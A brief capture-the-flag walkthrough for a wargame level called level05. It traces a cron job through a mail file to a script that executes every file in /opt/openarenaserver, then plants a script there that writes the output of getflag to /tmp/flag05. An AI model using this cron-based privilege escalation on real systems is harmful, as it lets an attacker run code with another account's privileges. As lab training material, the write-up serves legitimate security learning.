LEVEL05

- A "You have a new mail" message displays on the terminal.
- Among others, we look for "level05" to find more information:
"find / -name "level05"

- Many outpouts appear, last of which is /var/mail/level05, which looks promising.
- We go to the path and "cat level05".
- It is a cron job, executing a script at /usr/sbin/openarenaserver every 2 minutes.
- We go to the path and "cat openarenaserver".

- We find out that it iterates over all files in the directory, stores them, aand executes the file at the given path in debug mode.
- We make a script in /opt/openarenaserver that runs getflag and puts the output into /tmp/flag05.
"cd /opt/openarenaserver"
"nano flag.sh"
"#!/bin/bash/
/bin/getflag > /tmp/flag05"

- Then we run cat until the flag appears once the script gets executed:
"cat /tmp/flag05"
